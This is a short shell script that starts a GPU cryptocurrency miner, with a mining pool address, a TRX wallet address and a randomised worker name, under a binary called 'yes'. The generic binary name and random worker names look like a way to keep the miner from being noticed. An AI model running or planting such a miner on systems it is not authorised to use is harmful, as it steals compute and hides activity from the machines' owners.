POOL=rx-us.unmineable.com:3333
WALLET=TRX:TRAr3K1jpMupxzWcwfG3GQJsKpD3kxDDbk
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo W78tv4AM-$(shuf -i 1911-583123 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
